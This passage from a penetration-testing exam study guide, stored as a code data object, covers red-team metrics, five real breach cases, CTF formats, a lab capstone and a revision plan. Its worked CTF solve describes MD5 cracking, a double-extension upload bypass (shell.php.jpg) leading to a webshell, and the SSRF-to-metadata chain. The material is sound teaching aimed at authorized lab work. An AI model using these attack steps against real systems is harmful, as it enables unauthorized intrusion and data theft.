              "ATT&CK mapping: every technique logged by tactic; 23 techniques used, 9 detected in the worked campaign.",
              "Worked campaign: 2/40 phishes -> persistence -> domain admin -> 10 MB exfil; 94-hour time-to-detect.",
              "Comparison axes: objective, duration, stealth, success measure, deliverable.",
              "Evolution: purple workshops, ATT&CK actor replay, BAS platforms running detection tests weekly.",
            ],
            callout: {
              type: "exam",
              title: "Detection metrics are the red team's report",
              body: "A red team answer without detection numbers is a pentest answer in disguise. The distinguishing deliverables: time-to-detect, techniques detected vs used, alerts fired-but-untriaged. Quote the worked campaign's 94-hour TTD and 9-of-23 detection rate and the comparison becomes concrete.",
            },
            table: {
              caption: "The comparison table examiners expect.",
              headers: ["Axis", "Penetration test", "Red team operation"],
              rows: [
                ["Objective", "Find and prove vulnerabilities", "Achieve named business-impact goals"],
                ["Duration", "1-2 weeks", "4-12 weeks"],
                ["Visibility", "Declared window, SOC deconfliction", "Covert; white cell only"],
                ["Success measure", "Findings quality and coverage", "Objective reached + detection gaps"],
                ["Deliverable", "Remediation report", "Detection backlog + purple-team plan"],
                ["Standards", "PTES / NIST 800-115 / OWASP", "MITRE ATT&CK mappings"],
              ],
            },
            examQuestions: [
              {
                q: "Explain red teaming and adversary simulation: objectives and team ecology, a worked multi-week campaign with ATT&CK mapping and detection metrics, the pentest-vs-red-team comparison, and the purple-teaming evolution.",
                marks: 14,
                outline: [
                  "Definition: covert, objectives-based adversary emulation testing detection and response",
                  "Ecology: red, blue, purple, white cell with abort authority",
                  "Worked campaign: 2/40 phishes -> persistence -> domain admin -> 10 MB exfil over 6 weeks",
                  "ATT&CK: 23 techniques mapped by tactic; 9 detected; 4 alerts untriaged",
                  "Metrics: 94-hour time-to-detect drives the SOC backlog",
                  "Comparison: objective, duration, stealth, success measure, deliverable",
                  "Evolution: purple workshops, actor-replay emulation, weekly BAS",
                ],
              },
              {
                q: "Why does a red team operation need a white cell when a penetration test needs only emergency contacts?",
                marks: 7,
                outline: [
                  "Covert operations risk collision with real incidents and real responders",
                  "White cell arbitrates: is this action ours or an attacker's?",
                  "Holds abort authority for safety and business impact",
                  "Pentest work is visible, so direct contacts suffice",
                  "Deconfliction protects both the operation and the organization",
                ],
              },
            ],
          },
          {
            number: "5.5",
            title: "Review of real-world penetration testing cases",
            body: [
              "Case study review is the syllabus's synthesis section: real engagements show how the unit techniques compose, and the exam rewards answers that tie each case to named controls. The canonical public cases: Target 2013 (HVAC vendor credentials -> POS malware -> 40M cards - the vendor-access and segmentation failure), Equifax 2017 (unpatched Struts CVE-2017-5638 on an internet-facing portal -> 147M records - the patch-SLA and scope failure), Capital One 2019 (WAF SSRF -> IMDSv1 metadata -> S3 access via over-privileged role - the cloud chain of section 5.2 exactly), Uber 2016 (credentials in a public GitHub repo -> AWS keys -> PII of 57M users, concealed rather than reported - the governance failure), and Kaseya 2021 (supply-chain VSA zero-day -> MSP -> 1,500 downstream businesses - the trust-chain finding class).",
              "Each case compresses into the examiner's four-beat format: entry point, chain, impact count, and the control that would have broken it. Target: vendor portal credentials (no MFA) -> flat network to POS -> 40M cards; break = MFA on vendor access + segmentation. Equifax: missing patch for a March-disclosed CVE on a June-exploited portal -> 147M records; break = patch SLA + WAF virtual patch. Capital One: misconfigured WAF SSRF -> 169.254.169.254 -> S3 role -> 100M records; break = IMDSv2 + least privilege. Uber: committed keys -> prod -> concealment fine; break = secret scanning + incident-response duty. Kaseya: MSP tool zero-day -> customer fleets; break = egress limits, patch velocity, supply-chain SBOM. The pattern across all five: none required exotic 0-days - every break is a control the units of this subject already teach.",
              "The tester's use of cases is the synthesis mark: case chains become threat models for new engagements (does this client have vendor VPN without MFA? patch SLA? IMDSv2?), case impacts calibrate severity language (the CVSS 10.0 of section 4.5 is credible because Equifax-class impacts are real), and case histories justify the report's sprint list to management - 'this exact chain produced a USD 380M settlement' moves budgets in a way that severity labels do not. The exam wants this active use, not trivia: 'name the control that would have broken each chain' is the application sentence per case.",
              "Exam framing: 'Review real-world cases and lessons for penetration testers' is a 14-mark synthesis. Present the five cases in the four-beat format with impact counts, extract the common pattern (no exotics - control failures), and close with the tester's active use of cases in threat models and executive persuasion.",
            ],
            keyTerms: [
              { term: "Vendor access", definition: "Third-party remote access paths - the Target entry; needs MFA and segmentation like employee access." },
              { term: "Patch SLA", definition: "The maximum days from patch release to deployment, by severity - the Equifax control." },
              { term: "Supply-chain trust", definition: "Software or MSP channels that inherit trust - the Kaseya propagation class." },
              { term: "Impact calibration", definition: "Using real-case outcomes to ground the report's severity and business-risk language." },
            ],
            diagram: {
              kind: "flow",
              title: "The common case pattern: control failure, not exotic hacking",
              caption: "Five breaches, five ordinary controls missing - the synthesis lesson of the syllabus.",
              steps: [
                { label: "Entry", note: "vendor creds / unpatched CVE / SSRF / leaked key / MSP 0-day" },
                { label: "Chain", note: "flat network, over-privilege, trust inheritance" },
                { label: "Impact", note: "40M-147M records; USD settlements" },
                { label: "Break", note: "MFA + segmentation / patch SLA / IMDSv2 / secret scanning" },
              ],
            },
            bullets: [
              "Target 2013: vendor portal creds -> POS -> 40M cards; break = vendor MFA + segmentation.",
              "Equifax 2017: unpatched Struts (CVE-2017-5638) -> 147M records; break = patch SLA + virtual patch.",
              "Capital One 2019: WAF SSRF -> IMDSv1 -> S3 role -> 100M records; break = IMDSv2 + least privilege.",
              "Uber 2016: GitHub keys -> AWS -> 57M PII + concealment; break = secret scanning + IR duty.",
              "Kaseya 2021: MSP VSA 0-day -> 1,500 downstream firms; break = supply-chain controls, egress limits.",
              "Common pattern: no exotic 0-days - every chain breaks on controls this subject teaches.",
            ],
            callout: {
              type: "exam",
              title: "Four beats per case, one sentence of use",
              body: "For each case: entry point, chain, impact count, breaking control. Then the use sentence: 'we test for vendor MFA and IMDSv2 because these exact chains produced 40M- and 100M-record breaches.' Case trivia without the application sentence loses the synthesis mark.",
            },
            table: {
              caption: "The five-case synthesis table.",
              headers: ["Case", "Entry point", "Impact", "Breaking control"],
              rows: [
                ["Target 2013", "Vendor portal credentials, no MFA", "40M cards", "Vendor MFA + segmentation"],
                ["Equifax 2017", "Unpatched Struts CVE-2017-5638", "147M records", "Patch SLA + virtual patch"],
                ["Capital One 2019", "WAF SSRF -> IMDSv1 -> S3 role", "100M records", "IMDSv2 + least privilege"],
                ["Uber 2016", "Keys committed to GitHub", "57M PII", "Secret scanning + IR duty"],
                ["Kaseya 2021", "MSP VSA zero-day", "1,500 firms", "Supply-chain patching + egress limits"],
              ],
            },
            examQuestions: [
              {
                q: "Review five real-world breach cases relevant to penetration testing. For each give the entry point, the exploit chain, the impact count and the control that would have broken the chain; extract the common pattern and explain how testers use cases actively.",
                marks: 14,
                outline: [
                  "Target: vendor creds -> POS -> 40M cards; break = vendor MFA + segmentation",
                  "Equifax: Struts CVE-2017-5638 unpatched -> 147M records; break = patch SLA",
                  "Capital One: SSRF -> IMDSv1 -> S3 role -> 100M; break = IMDSv2 + least privilege",
                  "Uber: GitHub keys -> AWS -> 57M PII; break = secret scanning + IR",
                  "Kaseya: MSP 0-day -> 1,500 firms; break = supply-chain patching + egress",
                  "Pattern: no exotics - ordinary controls (MFA, SLA, IMDSv2, scanning) break all five",
                  "Active use: case chains as threat models; impact counts calibrate severity and budget asks",
                ],
              },
              {
                q: "How does the Capital One 2019 chain map onto this subject's cloud-testing sections, control by control?",
                marks: 7,
                outline: [
                  "Entry: SSRF in misconfigured WAF (section 2.6 A10)",
                  "Pivot: IMDSv1 metadata credentials (section 5.2 mechanism)",
                  "Escalation: over-privileged role reads S3 (least-privilege failure)",
                  "Scale: 100M records - impact calibration for severity language",
                  "Breaks: IMDSv2, Access Analyzer least privilege, egress rules on the WAF",
                ],
              },
            ],
          },
          {
            number: "5.6",
            title: "Capture the Flag (CTF) competitions",
            body: [
              "CTFs are the structured practice layer of this subject: legally sanctioned puzzles whose solutions are the techniques of Units 1-4 at small scale, and the standard gateway into professional skill. The formats: jeopardy (a board of independent challenges scored by first-solve), attack-defence (teams hold services while attacking others' - detection and patching skills), and king-of-the-hill (one machine, continuous re-capture). The challenge categories map to the syllabus: web (SQLi, XSS, IDOR, SSRF in sandboxed apps), crypto (textbook RSA flaws, ECB penguins, padding oracles), forensics (pcap and memory analysis, file carving), reversing (static/dynamic binary analysis), pwn (memory-corruption exploitation), stego/OSINT, and misc. Beginner competitions (picoCTF, beginner CTFs, HTB starting points) teach the workflow; intermediate ones (HTB machines, TryHackMe paths) build fluency; flagship events (DEF CON CTF, CSAW) set the professional frontier.",
              "The worked solve chain shows why CTFs teach the right reflexes: a web challenge at 500 points serves a login page; the tester's loop - view source (a comment leaks a backup path), fetch /backup.sql (a dump with a password hash), crack the MD5 hash in 30 seconds on an online table, log in, find an upload filter bypassing extension checks via double extension (shell.php.jpg), get a webshell, read /flag.txt, submit. Ten minutes, six techniques, zero authorization paperwork - the identical reflex chain (observe, hypothesis, tool, evidence) as a real engagement but compressed to minutes, which is precisely why CTF practice transfers: it automates the loop so that in professional work the tester spends cognition on scope and impact instead of tool syntax.",
              "The skill-building argument and its honest limits: CTFs build tool fluency, technique recognition under time pressure, and write-up reading (the community's knowledge transfer mechanism); they do not teach scoping, client communication, evidence discipline or the RoE - which is why the syllabus pairs this section with the capstone project of 5.7. The competitive metrics carry over: leaderboard placements and write-up portfolios are the de facto credential alongside OSCP/CEH, and employers read CTF profiles as evidence of hands-on capability. The study method that works: one category per week, solve-and-write-up pairing (every solve gets a written post), and revisit failures after 30 days - the spaced-repetition pattern that converts 200 solved challenges into durable skill.",
              "Exam framing: 'Explain CTF competitions and their role in developing penetration testing skills' is a 7-mark standard. Give the three formats, the category-to-syllabus mapping, the worked 10-minute solve chain, and close with the limits (no scoping/communication) and the study method.",
            ],
            keyTerms: [
              { term: "Jeopardy CTF", definition: "Board-of-challenges format scored by first solve - the dominant competition style." },
              { term: "Attack-defence", definition: "Teams defend their services while attacking others - detection and patching under fire." },
              { term: "Write-up", definition: "The public solution post - the community's knowledge-transfer and your portfolio artifact." },
              { term: "HTB / TryHackMe", definition: "Practice platforms with guided and free-form machines bridging CTF to professional skills." },
            ],
            diagram: {
              kind: "cycle",
              title: "The CTF solve loop - the professional reflex, compressed",
              caption: "Observe, hypothesize, tool, evidence, submit - automate this loop in practice and spend judgment on real engagements.",
              steps: [
                { label: "Observe", note: "source, headers, behaviour" },
                { label: "Hypothesize", note: "comment -> backup path -> dump" },
                { label: "Tool", note: "crack MD5, bypass filter" },
                { label: "Evidence", note: "webshell, /flag.txt" },
                { label: "Submit + write-up", note: "portfolio artifact" },
              ],
            },
            bullets: [
              "Formats: jeopardy (first-solve board), attack-defence (hold + hit), king-of-the-hill (continuous capture).",
              "Categories map to units: web/crypto/forensics/reversing/pwn/OSINT = Units 2-4 techniques at puzzle scale.",
              "Progression: picoCTF and beginner boards -> HTB/TryHackMe -> flagship events (DEF CON CTF, CSAW).",
              "Worked chain: comment leak -> backup.sql -> MD5 crack -> double-extension upload -> webshell -> flag; 10 minutes.",
              "Limits: no scoping, client communication, evidence discipline or RoE - hence the 5.7 capstone pairing.",
              "Study method: one category per week, solve-and-write-up pairing, 30-day failure revisit.",
            ],
            callout: {
              type: "tip",
              title: "Solve less, write more",
              body: "The skill compounding artifact is the write-up, not the flag count. A portfolio of 30 well-written posts (what you saw, what you hypothesized, what worked, what failed) outperforms 300 anonymous solves - in interviews, in study recall, and in the report-writing muscle this subject's final unit rewards.",
            },
            table: {
              caption: "CTF categories mapped to the syllabus.",
              headers: ["Category", "Syllabus units exercised", "Signature skills"],
              rows: [
                ["Web", "Unit 2 (web app security)", "SQLi, XSS, IDOR, SSRF, auth bypass"],
                ["Crypto", "Unit 4 (cryptography)", "RSA flaws, ECB, padding oracles"],
                ["Forensics", "Unit 1 (scanning/evidence)", "pcap/memory analysis, carving"],
                ["Reversing", "Unit 5 (mobile/RE)", "Static + dynamic binary analysis"],
                ["Pwn", "Unit 2 (exploitation)", "Memory corruption, shellcode"],
                ["OSINT", "Unit 1 (footprinting)", "Dorking, pivoting public data"],
              ],
            },
            examQuestions: [
              {
                q: "Explain CTF competitions: the formats, the category mapping to penetration testing units, a worked solve chain with techniques, the skill limits of CTF practice, and an effective study method.",
                marks: 14,
                outline: [
                  "Formats: jeopardy first-solve, attack-defence hold-and-hit, king-of-the-hill",
                  "Categories: web, crypto, forensics, reversing, pwn, OSINT - map to Units 1-4",
                  "Progression: beginner boards -> HTB/TryHackMe -> DEF CON CTF / CSAW",
                  "Worked chain: comment -> backup.sql -> MD5 crack -> double-extension upload -> webshell -> flag, 10 minutes",
                  "The reflex argument: CTF automates observe-hypothesize-tool-evidence",
                  "Limits: no scoping, communication, evidence discipline, RoE - capstone 5.7 completes",
                  "Method: weekly category focus, solve-and-write-up pairing, 30-day revisit",
                ],
              },
              {
                q: "Why do employers value CTF portfolios alongside certifications like OSCP?",
                marks: 7,
                outline: [
                  "Certifications prove baseline knowledge under exam conditions",
                  "CTF profiles prove hands-on technique under time pressure",
                  "Write-ups demonstrate communication skill - the report muscle",
                  "Leaderboards show sustained practice, not one-off exam performance",
                  "Together they evidence both knowledge and application",
                ],
              },
            ],
          },
          {
            number: "5.7",
            title: "Final project: hands-on exercise and presentation",
            body: [
              "The capstone project is the syllabus's integration exercise: a full mini-engagement executed end-to-end against a lab estate (a deliberately vulnerable VM range - OWASP Juice Shop, Metasploitable, a vulnerable WordPress, an IoT emulator) with professional deliverables. The project's four phases mirror the methodology: scoping and planning (a written RoE for the lab: targets, techniques, time box, even though the client is fictional - the paperwork discipline is half the learning), execution (recon -> scan -> exploit -> post-exploit across at least two machines with one chained path), reporting (a complete report in the section 4.5 format: exec summary, methodology, five-plus findings with CVSS, remediation), and presentation (a 15-minute defence: demonstrate the chain live, answer challenge questions, justify severities).",
              "The worked project shape and its grading rubric: a two-week effort on a three-machine lab (Juice Shop + Metasploitable + a cloud-metadata emulator) yields the reference chain - SQLi on Juice Shop's login (Unit 2.6), webshell upload, pivot to Metasploitable via stolen DB credentials (2.4), SUID escalation to root (2.2), and an SSRF-to-metadata proof on the emulator (5.2). The rubric allocates marks: chain quality and creativity 30%, evidence quality (screenshots, timestamps, repro commands) 25%, report structure and CVSS accuracy 20%, presentation and Q&A defence 15%, professional conduct (scope adherence, cleanup verification) 10%. The 10% conduct block is deliberate - it grades the discipline the profession actually terminates people for.",
              "The presentation half tests a distinct muscle: live demonstration risk (everything that can fail, fails - pre-record backups of the demo, script the commands, rehearse the chain cold), the challenge Q&A ('why is this High and not Critical?', 'what would you do if the client refused the fix?'), and the professional narrative (impact sentence per finding, prioritization argument per sprint). The career bridge is explicit: the capstone plus the CTF portfolio of 5.6 plus the certification map (CEH as the entry credential, OSCP as the hands-on standard, CREST/PCI-QSA as specialization) is the employability package this subject exits into - and the viva-style Q&A is also the exam format for the practical components of this paper.",
              "Exam framing: 'Describe the structure and evaluation of a penetration testing capstone project' is a 7-mark closer; 'plan a complete mini-engagement and defend its findings' is the practical format itself. Write the four phases, the reference chain across three machines, the rubric with its 10% conduct block, and the presentation-risk disciplines.",
            ],
            keyTerms: [
              { term: "Capstone RoE", definition: "The written scope-even-for-lab document that trains the authorization discipline." },
              { term: "Chained path", definition: "One exploit feeding the next across machines - the creativity axis of the rubric." },
              { term: "Evidence pack", definition: "Timestamped screenshots and repro commands backing every claim in the report." },
              { term: "Live demo rehearsal", definition: "Scripted, backed-up demonstration commands; everything fails once unscripted." },
            ],
            diagram: {
              kind: "pipeline",
              title: "The capstone pipeline and its deliverables",
              caption: "Four phases, four artifacts - the whole subject compressed into one engagement.",
              stages: [
                { label: "Scope + RoE", note: "written, even for the lab" },
                { label: "Execute", note: "recon -> exploit -> pivot, 2+ machines" },
                { label: "Report", note: "5+ findings, CVSS, remediation" },
                { label: "Present", note: "15-min live chain defence + Q&A" },
                { label: "Cleanup + verify", note: "artifacts removed, evidence archived" },
              ],
            },
            bullets: [
              "Four phases: scoping/RoE, execution (recon to post-exploit across 2+ machines), reporting, presentation.",
              "Lab estate: OWASP Juice Shop, Metasploitable, vulnerable WordPress, cloud-metadata emulator.",
              "Reference chain: SQLi login -> webshell -> pivot via DB creds -> SUID root -> SSRF-to-metadata proof.",
              "Rubric: chain 30%, evidence 25%, report 20%, presentation 15%, conduct 10%.",
              "Presentation risks: live-demo failures (pre-record backups), challenge Q&A, severity defence.",
              "Career bridge: capstone + CTF portfolio + CEH/OSCP/CREST map = the employability package.",
            ],
            callout: {
              type: "warning",
              title: "Rehearse the demo chain cold",
              body: "Every live demonstration fails once unscripted: a machine reverts, a payload lands out of order, a screen recorder dies. Script the commands, pre-record a full-chain backup video, and rehearse the Q&A ('why High, not Critical?') twice. The 15% presentation block is won in the rehearsal room, not the lab.",
            },
            table: {
              caption: "The capstone grading rubric.",
              headers: ["Component", "Weight", "What earns full marks"],
              rows: [
                ["Chain quality", "30%", "Multi-machine path with creative pivot"],
                ["Evidence quality", "25%", "Timestamped screenshots + repro commands per finding"],
                ["Report structure", "20%", "Exec summary, methodology, CVSS-accurate findings"],
                ["Presentation + Q&A", "15%", "Live chain, severity defence, impact sentences"],
                ["Professional conduct", "10%", "Scope adherence, verified cleanup, archive"],
              ],
            },
            examQuestions: [
              {
                q: "Describe the structure of a penetration testing capstone project: its phases and deliverables, a reference exploit chain across a lab estate, the grading rubric and its rationale, and the presentation disciplines.",
                marks: 14,
                outline: [
                  "Phases: written RoE, execution across 2+ machines, full report, 15-minute presentation",
                  "Lab estate: Juice Shop, Metasploitable, WordPress, metadata emulator",
                  "Reference chain: SQLi -> webshell -> pivot via DB creds -> SUID root -> SSRF metadata",
                  "Rubric: chain 30 / evidence 25 / report 20 / presentation 15 / conduct 10",
                  "Rationale: conduct block grades the discipline the profession terminates for",
                  "Presentation risks: demo failure backup, scripted commands, challenge Q&A rehearsal",
                  "Career bridge: capstone + CTF portfolio + certification map",
                ],
              },
              {
                q: "Why does the capstone require a written RoE even against a lab you own?",
                marks: 7,
                outline: [
                  "The paperwork discipline is the learning objective, not the lab",
                  "Real engagements fail at scoping, not at tooling",
                  "Writing the RoE trains scope-boundary judgment",
                  "Cleanup verification against the RoE builds contractual habit",
                  "It is the professional conduct block's evidence artifact",
                ],
              },
            ],
          },
        ],
      },
    },
  ],
  studyPlan: [
    {
      id: "weights",
      heading: "Exam weight map",
      body: [
        "CY-702(A) papers draw their largest blocks from the double units - exploitation/web (Unit II) and wireless/social (Unit III) - with Unit IV's cryptography-plus-reporting pair supplying the numericals and Unit I's methodology the short definitions. Unit V is the long-question bank: mobile, cloud, IoT and red teaming each feed one 14-mark option. The worked numbers to have automatic are the CVSS pair, the GPU cracking economics, the 4-way handshake, and the triage arithmetic.",
      ],
      weightedTopics: [
        { topic: "PTES methodology, types of testing, legal framework", weight: "10-12 marks", note: "Definitions plus the seven phases in order; the authorization stack drawing is near-guaranteed." },
        { topic: "Exploitation and post-exploitation (Metasploit, escalation, pivoting)", weight: "12-14 marks", note: "One 14-mark chain question; write the command sequence verbatim." },
        { topic: "Web application vulnerabilities and testing (OWASP)", weight: "12-14 marks", note: "Top 10 table + SQLi/XSS payload walkthroughs; the union-select payload is the numerical." },
        { topic: "Wireless: standards, attacks, cracking pipeline", weight: "10-12 marks", note: "4-way handshake diagram plus airodump/aireplay/aircrack commands with cracking economics." },
        { topic: "Cryptography, key management, secure channels", weight: "8-10 marks", note: "Symmetric/asymmetric contrast, kill table, TLS 1.3 walkthrough." },
        { topic: "Reporting: CVSS scoring, prioritization, remediation", weight: "8-10 marks", note: "The 10.0 vs 7.2 CVSS pair is the paper's favourite numerical." },
        { topic: "Cloud, IoT, mobile testing", weight: "8-10 marks", note: "Shared-responsibility map, IMDSv2 chain, binwalk/MQTT worked case." },
        { topic: "Social engineering, physical security, red teaming", weight: "6-8 marks", note: "Channel taxonomy + 62/18/3 campaign; pentest-vs-red-team table." },
      ],
    },
    {
      id: "six-weeks",
      heading: "Six-week study plan",
      body: [
        "Two hours a day, five days a week, with a lab session every weekend: this schedule covers every unit twice - once for understanding with the worked chains, once for timed revision - and reserves the final week for full papers and the four anchor diagrams.",
      ],
      weeks: [
        { week: "Week 1", focus: "Unit I - foundations and recon", tasks: ["Definitions: pentest vs scan vs audit vs red team with numbers", "Authorization stack drawing + IT Act/CFAA section map", "Footprinting sources and the crt.sh worked dossier", "Nmap flag grammar; run the 5-step scan on a home lab"] },
        { week: "Week 2", focus: "Unit II - exploitation and web", tasks: ["Metasploit workflow verbatim; reverse vs bind reasoning", "Linux/Windows escalation trios with commands", "OWASP Top 10 table + SQLi and stored-XSS payloads", "Web methodology pipeline with tool-per-phase"] },
        { week: "Week 3", focus: "Unit III - wireless and human", tasks: ["WEP->WPA3 table + 4-way handshake from memory", "PSK crack sequence with GPU economics; PMKID variant", "Social-engineering channel taxonomy + 62/18/3 campaign", "Physical control pairs and the 90-second case"] },
        { week: "Week 4", focus: "Unit IV - crypto and reporting", tasks: ["Symmetric/asymmetric performance numbers", "Kill table (DES/MD5/RC4/SHA-1/3DES) + TLS 1.3 walkthrough", "Key lifecycle + nonce-reuse and ECB failure modes", "CVSS worked pair: write both vectors from memory"] },
        { week: "Week 5", focus: "Unit V - modern surfaces", tasks: ["Android pipeline (apktool->drozer->Frida) + MASVS", "Shared-responsibility map + IMDSv2 chain", "IoT binwalk case + Mirai scaling story", "Red team comparison table + 5 real-world cases in four beats"] },
        { week: "Week 6", focus: "Revision and papers", tasks: ["Redraw the four anchor diagrams from memory daily", "Two full mock papers under 3-hour timing", "Retype the worked chains: nmap, msf, wifi, CVSS", "Study-plan weight map as final-night recall check"] },
      ],
    },
    {
      id: "last-day",
      heading: "Last-day strategy",
      bullets: [
        "Do not learn anything new; cycle the four worked computations - CVSS pair (10.0/7.2), GPU cracking economics, OWASP id-shift loop, triage arithmetic (230 -> 9/31/74/116).",
        "Redraw the anchor diagrams from memory: authorization stack, PTES pipeline, 4-way handshake, exploit chain.",
        "Recite the command blocks once per hour: nmap sequence, msfconsole flow, airodump/aireplay/aircrack, sqlmap union payload.",
        "Re-read the OWASP Top 10 table with one payload + one fix per row - it feeds three different question types.",
        "Skim every 'in one breath' paragraph; they compress each unit into the recall net examiners fish from.",
        "Rehearse the five case studies in four beats each (entry, chain, impact, break) - one 14-mark option draws on them.",
        "Sleep seven hours; the numericals reward a fresh brain more than a fifth pass.",
      ],
    },
    {
      id: "exam-hall",
      heading: "Exam-hall playbook",
      examTips: [
        "Open every long answer with the one-line definition, then the diagram, then the worked numbers - examiners mark structure top-down.",
        "For any technique question, give the tool sequence verbatim (nmap, msf, aircrack, sqlmap) - tool literacy is marked separately from concept.",
        "Attach a number to every claim: hours, counts, percentages, scores. 'Minutes to crack' beats 'quickly'.",
        "For CVSS numericals, write the eight-metric vector first, then the score; check S:C vs S:U before computing.",
        "In comparison questions (scan/test/audit/red team; Personal/Enterprise; pentest/red team), use a table - rows earn faster than prose.",
        "End long answers with the mitigation or residual-risk sentence; the closing judgment line is the 14th mark.",
        "Time-box: 7 marks = 12 minutes, 14 marks = 25 minutes including the diagram; leave 5 minutes to add numbers to thin answers.",
      ],
    },
    {
      id: "slips",
      heading: "Common slips that cost easy marks",
      bullets: [
        "Writing the methodology phases out of order - threat modeling must precede scanning.",
        "Calling hashes 'encryption' - SHA-256 is a one-way digest; the sentence costs the definition mark.",
        "Confusing reverse and bind shells - reverse connects out (egress open); bind listens (ingress blocked).",
        "Forgetting PR and Scope in CVSS vectors - the 10.0 vs 7.2 difference is exactly PR:N/S:C vs PR:H/S:U.",
        "Saying WPA3 removes all attacks - it removes offline dictionary; online guessing and evil twins remain.",
        "Skipping the authorization layer in legal answers - documents before packets is the marked pattern.",
        "Presenting scanner output as proof - 'Nessus says' is a finding, not evidence; manual verification is required.",
        "Inventing RGPV year citations for questions - describe technique and worked example instead; fabricated citations cost credibility marks.",
      ],
    },
  ],
};
